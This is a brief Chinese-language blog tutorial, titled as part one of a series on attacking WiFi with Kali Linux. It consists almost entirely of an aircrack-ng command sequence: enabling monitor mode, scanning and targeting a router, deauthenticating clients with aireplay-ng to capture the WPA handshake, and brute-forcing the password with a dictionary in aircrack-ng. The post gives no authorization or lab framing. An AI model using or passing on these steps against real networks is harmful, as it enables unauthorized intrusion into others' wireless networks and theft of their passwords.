kali攻击WiFi、攻击密码-暴力破解（一）

发表于 2021-09-10 更新于 2022-07-04 分类于 技术
本文字数： 381 阅读时长 ≈ 1 分钟

工具：带监听功能的无线网卡RT2070/3070

系统：kali最新版

命令

①ifconfig //确定网卡是否在读取

②airmon-ng start wlan0 //开启监听模式

③ifconfig //确认wlan0mon

④airodump-ng wlan0mon //监听周围的WiFi

⑤airodump-ng -c CH –bssid 路由器的mac -w 存储文件名（默认保存在桌面） wlan0mon //监听路由器的信道

handshake之后，会得到一个握手包

aireplay-ng -0 攻击次数 -a BASID -c STATION –ignore-negative-one wlan0mon

⑥aircrack-ng -a2 -b MAC地址 -w 密码字典的位置 ~/*.cap（字典爆破）
